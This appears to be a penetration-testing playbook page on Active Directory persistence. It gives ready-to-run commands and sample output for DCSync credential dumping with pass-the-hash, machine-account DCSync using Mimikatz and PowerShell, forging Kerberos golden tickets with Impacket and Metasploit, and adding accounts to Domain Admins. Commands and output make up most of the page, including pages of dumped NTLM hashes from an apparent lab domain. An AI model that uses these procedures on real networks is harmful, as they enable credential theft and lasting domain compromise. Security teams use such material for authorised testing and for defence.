<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# AD Advanced Persistence
### Tags
<details><summary>Tags (Click to expand)</summary><p>

Environment

		#@active #@directory #@activedirectory #@microsoft

Context

		#@dcsync #@kerberos #@golden #@ticket #@domain #@persistence #@persist

Tools

		#@secretsdump.py #@impacket #@secretsdump

</p></details>

### References

### Overview


### Process
#### From a Linux Machine
* DCSync
	* DCSync with Pass-the-Hash ([TTP](TTP/T1003_OS_Credential_Dumping/006_DCSync/T1003.006.md))
		* <details><summary>Recommended: Secretsdump.py (Impacket) (Click to expand)</summary><p>
			* Examples
				* Example 1: Most Data Collection

						secretsdump.py $DOMAIN/$DOMAIN_ADMIN@$DOMAIN_CONTROLLER -hashes :$NTHASH -pwd-last-set -history -user-status -o outfile.txt
					* <details><summary>Example Output (Click to expand)</summary><p>

							root@jack-Virtual-Machine:~# secretsdump.py $DOMAIN/$DOMAIN_ADMIN@$DOMAIN_CONTROLLER -hashes :$NTHASH -pwd-last-set -history -user-status                          
							Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation                                                                              
							                                                                                                                                                                   
							[*] Service RemoteRegistry is in stopped state                                                                                                                     
							[*] Starting service RemoteRegistry                                                                                                                                
							[*] Target system bootKey: 0x15003c60281cd7a996eb96310d049c6d                                                                                                      
							[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                                                                               
							Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::                                                                             
							Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
							DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                            
							[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                                           
							[*] Dumping cached domain logon information (domain/username:hash)                                                                                                 
							[*] Dumping LSA Secrets                                                                                                                                            
							[*] $MACHINE.ACC                                                                                                                                                   
							MICROSOFTDELIVE\DC01$:aes256-cts-hmac-sha1-96:efb4a8a4ffd658e0833fbfbabb4015a7451280cd99017932282d704beae2d8c2                                                     
							MICROSOFTDELIVE\DC01$:aes128-cts-hmac-sha1-96:70dd153e7c9bc7cd2be95fd58232698f                                                                                     
							MICROSOFTDELIVE\DC01$:des-cbc-md5:7a64a26e835816c2                                                                                                                 
							MICROSOFTDELIVE\DC01$:plain_password_hex:8697a026482afa02a73cee3d403063eaa715de0da2de33761b88e9c68276309a35179e6364bbf0d2597785c0c9ca9646b2c8e827b7389bd039c3528c45
							db517adcf426fbd403bb0c90d8ec5382f4626f3e242cf44f59c09db3fd63d779e989a148177a29c98e7ebc20a0bf90fbbb064b08690bc1a07b28cd1969d1b74106eb309692b04dc170c92056ddd4c9f787c
							f3faa8782271d36d8305c53bea89331a7d1288e9481f9d4bdd299d17e66d226f1394b8be268fa0742d8c521951bc500ca4dc4bc98ecbd52ae33ddc66ff6e880484c91101243912950852da90da2af1cc9f2
							59f22068bcb076ad0a0f1ec8240ccfab                                                                                                                                   
							MICROSOFTDELIVE\DC01$:aad3b435b51404eeaad3b435b51404ee:94f2721f78c81bb17b4e3b39acb1cba0:::                                                                         
							[*] $MACHINE.ACC_history 
							MICROSOFTDELIVE\DC01$:aes256-cts-hmac-sha1-96:601ccd42ada79b30145324847696e3ab85e59240c6aff7b24d52b44ef67fb168
							MICROSOFTDELIVE\DC01$:aes128-cts-hmac-sha1-96:53ad66afcfb8990826cc6a8eef55442b
							MICROSOFTDELIVE\DC01$:des-cbc-md5:972cfba40b6b2c8c
							MICROSOFTDELIVE\DC01$:plain_password_hex:6fc0bec7d050a2bdedc1c94a07413e8b2083571f28a9c98be5ef186d30ed85f35e7598bab0c00a6a371c05e379a51f459026b6ef81f15c4e7c8a2d5daf
							54eab65fd3c8ff1dfc9a1d2a01d2bc364a6bc144708e2751588a5013b91b9e51eae7f00931d901421b4f743b9d4f94884de687141344f297bb61aaa10e2fd3e3ac577c7d01a26b3ccc249fb42898c43cea1
							f18d8ba1313ab8a8b196959e0cbe223a6e94692fbec95f3fa8d751ea7f5ab447c7572faeac81bdb70015372329c544f36a6f46c67a0b2bd6051e63ed7c80c1a874887d14d615e6c4662cb1096ecbd554288
							3b719e2950fbc22507355475f89b97be
							MICROSOFTDELIVE\DC01$:aad3b435b51404eeaad3b435b51404ee:c3b538a0e98cb39544be97dc3a9c3ddb:::

							<TRUNCATED>

							NL$KM:d4df59c53532c8069d972281baf28b61ac89d7b335ec1cbd4501ef69bf44ce75e87cf207af1cbb2b67bebd58a1ed34d4e8084ede8469505f702ee05a4028f892                             
							[*] NL$KM_history                                                                                                                                                  
							 0000   D4 DF 59 C5 35 32 C8 06  9D 97 22 81 BA F2 8B 61   ..Y.52...."....a                                                                                        
							 0010   AC 89 D7 B3 35 EC 1C BD  45 01 EF 69 BF 44 CE 75   ....5...E..i.D.u                                                                                        
							 0020   E8 7C F2 07 AF 1C BB 2B  67 BE BD 58 A1 ED 34 D4   .|.....+g..X..4.                                                                                        
							 0030   E8 08 4E DE 84 69 50 5F  70 2E E0 5A 40 28 F8 92   ..N..iP_p..Z@(..                                                                                        
							NL$KM_history:d4df59c53532c8069d972281baf28b61ac89d7b335ec1cbd4501ef69bf44ce75e87cf207af1cbb2b67bebd58a1ed34d4e8084ede8469505f702ee05a4028f892                     
							[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                      
							[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                               
							Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-06-24 11:39) (status=Enabled)                              
							Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (pwdLastSet=never) (status=Disabled)                                                
							krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9dbba9a65b04b9752b47b29860722ece::: (pwdLastSet=2022-06-24 13:27) (status=Disabled)                                    
							microsoftdelivery.com\domain_admin:1105:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-06-24 13:34) (status=Enabled)        
							microsoftdelivery.com\domain_user:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-06-24 13:35) (status=Enabled)         
							MSOL_acade27cae4b:1107:aad3b435b51404eeaad3b435b51404ee:1ecc20ea19e35fb777c0a4f24c0fc500::: (pwdLastSet=2022-06-24 16:05) (status=Enabled)                         
							microsoftdelivery.com\Domain_User_ADCS:1114:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-09 15:11) (status=Enabled)    
							microsoftdelivery.com\domain_user_writer:1115:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-10 10:09) (status=Enabled)  
							microsoftdelivery.com\domain_user_target:1116:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-10 10:09) (status=Enabled)  
							microsoftdelivery.com\kerberoastable:1120:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-12 20:28) (status=Enabled)      
							microsoftdelivery.com\domain_user_builtin:1121:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-12 21:10) (status=Enabled) 
							microsoftdelivery.com\backup_operator:1122:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-17 14:50) (status=Enabled)     
							microsoftdelivery.com\account_operator:1123:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-17 14:59) (status=Enabled)    
							microsoftdelivery.com\dns_admin:1124:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-17 15:00) (status=Enabled)           
							microsoftdelivery.com\server_operator:1125:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-17 15:00) (status=Enabled)     
							microsoftdelivery.com\schema_admin:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-17 15:00) (status=Enabled)        
							microsoftdelivery.com\asreproastable:1127:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=2022-08-17 15:03) (status=Enabled)      
							DC01$:1002:aad3b435b51404eeaad3b435b51404ee:94f2721f78c81bb17b4e3b39acb1cba0::: (pwdLastSet=2022-07-24 21:44) (status=Enabled)                                     
							AZUREADSSOACC$:1108:aad3b435b51404eeaad3b435b51404ee:da7f997861cfcb15397cf2b2c20441e3::: (pwdLastSet=2022-06-24 16:30) (status=Enabled)                            
							DC02$:1109:aad3b435b51404eeaad3b435b51404ee:6d7c86913417701e4d8aed339869afec::: (pwdLastSet=2022-08-12 20:36) (status=Enabled)                                     
							DC02$_history0:1109:aad3b435b51404eeaad3b435b51404ee:31c2c0d119d0cb9e1a0114009e1a1b38:::
							CA$:1110:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42::: (pwdLastSet=never) (status=Enabled)
							CA$_history0:1110:aad3b435b51404eeaad3b435b51404ee:fcbf81ccf4c8b21fa343ca3fbcbf2ff1:::
							CA$_history1:1110:aad3b435b51404eeaad3b435b51404ee:aff2a270a91ccb319764c90ef4ff9e20:::
							<TRUNCATED>
				* Example 2: Basic Data Collection

						secretsdump.py -just-dc $DOMAIN/$DOMAIN_ADMIN@$DOMAIN_CONTROLLER -hashes :$NTHASH
					* <details><summary>Example Output (Click to expand)</summary><p>

							root@jack-Virtual-Machine:~# secretsdump.py -just-dc $DOMAIN/$DOMAIN_ADMIN@$DOMAIN_CONTROLLER -hashes :$NTHASH                                                     
							Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation                                                                              
							                                                                                                                                                                   
							[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                      
							[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                               
							Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::                                                                             
							Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                     
							krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9dbba9a65b04b9752b47b29860722ece:::                                                                                    
							microsoftdelivery.com\domain_admin:1105:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::                                                       
							microsoftdelivery.com\domain_user:1106:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::                                                        
							MSOL_acade27cae4b:1107:aad3b435b51404eeaad3b435b51404ee:1ecc20ea19e35fb777c0a4f24c0fc500:::                                                                        
							microsoftdelivery.com\Domain_User_ADCS:1114:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::                                                   
							microsoftdelivery.com\domain_user_writer:1115:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::                                                 
							microsoftdelivery.com\domain_user_target:1116:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::                                                 
							microsoftdelivery.com\kerberoastable:1120:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::                                                     
							microsoftdelivery.com\domain_user_builtin:1121:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::                                                
							microsoftdelivery.com\backup_operator:1122:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::                                                    
							microsoftdelivery.com\account_operator:1123:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
							microsoftdelivery.com\dns_admin:1124:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
							microsoftdelivery.com\server_operator:1125:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
							microsoftdelivery.com\schema_admin:1126:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
							microsoftdelivery.com\asreproastable:1127:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
							DC01$:1002:aad3b435b51404eeaad3b435b51404ee:94f2721f78c81bb17b4e3b39acb1cba0:::
							AZUREADSSOACC$:1108:aad3b435b51404eeaad3b435b51404ee:da7f997861cfcb15397cf2b2c20441e3:::
							DC02$:1109:aad3b435b51404eeaad3b435b51404ee:6d7c86913417701e4d8aed339869afec:::
							CA$:1110:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
							EXCHANGE$:1111:aad3b435b51404eeaad3b435b51404ee:4dd05161179eb2b2be7d8d7406037005:::
							APP$:1112:aad3b435b51404eeaad3b435b51404ee:d113631151c72b8a807aa891c85c1f45:::
							WIN11$:1113:aad3b435b51404eeaad3b435b51404ee:a0a3b45f929e097b3454477231a43e28:::
							DESKTOP-IHAD3T62$:1118:aad3b435b51404eeaad3b435b51404ee:2cf707d270d1b3a2a00b295dffa41410:::
							KERBEROSUNCD$:1129:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
	* Machine Account DCSync
		* <details><summary>References (Click to expand)</summary><p>
			* [https://gist.github.com/netbiosX/089a9d97a4f60016a6935500f328c17c](https://gist.github.com/netbiosX/089a9d97a4f60016a6935500f328c17c)
			* [https://stealthbits.com/blog/server-untrust-account/](https://stealthbits.com/blog/server-untrust-account/)
			* [https://github.com/STEALTHbits/ServerUntrustAccount](https://github.com/STEALTHbits/ServerUntrustAccount)
			* [https://adsecurity.org/?p=2753](https://adsecurity.org/?p=2753)
			* [https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/](https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/)
		* Requirements
			* `ms-DS-MachineAccountQuota` - By default allows 10 computers added
		* <details><summary>Process (Click to expand)</summary><p>
			1. Create a new computer account's group
				* impacket's addcomputer.py -<br />

						addcomputer.py
			1. Modify the computer  account's group

			1. 
* Kerberos Golden Ticket Attack ([`Steal or Forge Kerberos Tickets - Golden Ticket` TTP](TTP/T1558_Steal_or_Forge_Kerberos_Tickets/001_Golden_Ticket/T1558.001.md))
	* References
		* [https://pentestlab.blog/2018/04/09/golden-ticket/](https://pentestlab.blog/2018/04/09/golden-ticket/)
	* Process
		* <details><summary>Impacket (Click to expand)</summary><p>
			1. Enumerate the domain SID. The target must(?) be a domain-joined Windows system, but not necessarily the domain controller.

					lookupsid.py $DOMAIN/$DOMAIN_USER@$TARGET 0
				* Example Output

						[*] Brute forcing SIDs at 192.168.0.37
						[*] StringBinding ncacn_np:192.168.0.37[\pipe\lsarpc]
						[*] Domain SID is: S-1-5-21-2959836547-4011815163-3994231233
			1. Use the compromised KRBTGT Hash to generate the goldent ticket

					ticketer.py -nthash $NTHASH -domain-sid $DOMAIN_SID -domain $DOMAIN TargetUser
				* Example Output

						[*] Creating basic skeleton ticket and PAC Infos
						[*] Customizing ticket for purple.lab/Administrator
						[*]     PAC_LOGON_INFO                                              
						[*]     PAC_CLIENT_INFO_TYPE                                        
						[*]     EncTicketPart                                               
						[*]     EncAsRepPart                                                
						[*] Signing/Encrypting final ticket
						[*]     PAC_SERVER_CHECKSUM                                         
						[*]     PAC_PRIVSVR_CHECKSUM                                        
						[*]     EncTicketPart                                               
						[*]     EncASRepPart                                                
						[*] Saving ticket in Administrator.ccache
			1. Export the ccache file to be used with impacket

					export KRB5CCNAME=/path/to/file.ccache
			1. Use the kerberos authentication with impacket (wmiexec/smbexec/psexec/dcomexec). The domain and the target must be reachable via DNS or a custom entry in /etc/hosts (e.g., `192.168.1.10 target.domain`)

					wmiexec.py -k -no-pass target.domain/userName@host.target.domain

#### From a Windows Machine
* DCSync
	* <details><summary>Rubeus (Click to expand)</summary><p>
* Kerberos Golden Ticket Attack ([`Steal or Forge Kerberos Tickets - Golden Ticket` TTP](TTP/T1558_Steal_or_Forge_Kerberos_Tickets/001_Golden_Ticket/T1558.001.md))
* Machine Account DCSync
	* References
		* [https://gist.github.com/netbiosX/089a9d97a4f60016a6935500f328c17c](https://gist.github.com/netbiosX/089a9d97a4f60016a6935500f328c17c)
		* [https://github.com/STEALTHbits/ServerUntrustAccount](https://github.com/STEALTHbits/ServerUntrustAccount)
		* [https://adsecurity.org/?p=2753](https://adsecurity.org/?p=2753)
		* [https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/](https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/)
	* Requirements
		* `ms-DS-MachineAccountQuota` - By default allows 10 computers added
		* Machine account `userAccountControl` attribute must be `0x2000 = ( SERVER_TRUST_ACCOUNT )` (`8192` in decimal format)
			* Requires DA to modify
	* Overview
		* Creates a new machine account to perform DCSync with instead of targeting a legitimate DC.
	* Process
		* <details><summary>Method 1: Steps broken apart</summary><p>
			1. Create a new computer account
				* PowerMad

						Import-Module .\Powermad.psm1
						New-MachineAccount -MachineAccount <MachineAccountName> -Domain lab.local -DomainController dc.lab.local
					* You will be prompted to enter password for the account
				* The new computer primary group id is `515`
			1. Modify the computer account's group

					Get-ADComputer <newcomputername> -pro * | Select-object name, primarygroupid, useraccountcontrol
					Set-ADComputer <newcomputername> -replace @{ "userAccountcontrol" = 8192 }
			1. Inject the NTLM hash version of the password for use in DCSync
				* Mimikatz

						privilege::debug
						sekurlsa::pth /user:<machineaccount> /domain:domain.local /ntlm:<NTLMHash>
			1. Perform a DCSync
				* Mimikatz

						lsadump::dcsync /domain:domain.local /user:krbtgt
		* <details><summary>Method 2: Invoke-ServerUntrustAccount</summary><p>
			* References
				* [https://stealthbits.com/blog/server-untrust-account/](https://stealthbits.com/blog/server-untrust-account/)
			* Process
				1. Create Computer Account

						Import-Module .\ServerUntrustACcount.ps1; Add-ServerUntrustAccount -ComputerName "<computer_name>" -Password "<password>" -Verbose
				1. Collect the password hash of the krbtgt account

						Invoke-ServerUntrustAccount -ComputerName "Pentestlab" -Password "Password123" -MimikatzPath ".\mimikatz.exe"
		* <details><summary>Method 3: NetBiosX/PentestLabs PowerShell Single-Step Make account with DC properties</summary><p>
			* References
				* netbiosx GitHub -<br />[https://gist.github.com/netbiosX/089a9d97a4f60016a6935500f328c17c](https://gist.github.com/netbiosX/089a9d97a4f60016a6935500f328c17c)
				* PentestLab Blog -<br />[https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/](https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/)
			* Process
				1. Create the following PowerShell module.

						function Execute-userAccountControl
						{
						[CmdletBinding()]
						        param
						        (
						                [System.String]$DomainFQDN = $ENV:USERDNSDOMAIN,
						                [System.String]$ComputerName = 'Pentestlab',
						                [System.String]$OSVersion = '10.0 (18363)',
						                [System.String]$OS = 'Windows 10 Enterprise',
						                [System.String]$DNSName = "$ComputerName.$DomainFQDN",
						$MachineAccount = 'Pentestlab'
						        )
						$secureString = convertto-securestring "Password123" -asplaintext -force
						$VerbosePreference = "Continue"
						 
						Write-Verbose -Message "Creating Computer Account: $ComputerName"
						New-ADComputer $ComputerName -AccountPassword $securestring -Enabled $true -OperatingSystem $OS -OperatingSystemVersion $OS_Version -DNSHostName
						$DNSName -ErrorAction Stop;
						Write-Verbose -Message "$ComputerName created!"
						Write-Verbose -Message "Attempting to establish persistence."
						Write-Verbose -Message "Changing the userAccountControl attribute of $MachineAccount computer to 8192."
						Set-ADComputer $MachineAccount -replace @{ "userAccountcontrol" = 8192 };
						Write-Verbose -Message "$MachineAccount is now a Domain Controller!"
						Write-Verbose -Message "Domain persistence established!You can now use the DCSync technique with Pentestlab credentials."
						$VerbosePreference = "Continue"
						}
				1. Execute the  Module

						Import-Module .\userAccountControl.ps1
						Execute-userAccountControl
		* <details><summary>Method 4: Use existing machine accounts</summary><p>M
			1. Identify Administrator of AD

					Get-ADGroupMember "Administrators"
			1. Add the machine account to DA group

					net group "Domain Admins" <machineaccountwithdollarsign> /add /domain
* Golden Certificate
	* Needs Research: GhostPack's GitHub: ForgeCert -<br />[https://github.com/GhostPack/ForgeCert](https://github.com/GhostPack/ForgeCert)

#### From a C2
* Golden Tickets
	* <details><summary>Metasploit (Click to expand)</summary><p>
		* References
			* [https://pentestlab.blog/2018/04/09/golden-ticket/](https://pentestlab.blog/2018/04/09/golden-ticket/)
		* Process
			1. Use the Golden Ticket module

					post/windows/escalate/golden_ticket
			1. Set variables

					set KRBTGT_HASH <KRBTGT_HASH>
					set DOMAIN SID <DOMAIN_SID>
					set DOMAIN <DOMAIN>
					set USER Administrator
					set GROUPS 512,513,518,519,520
			1. Execute

					run
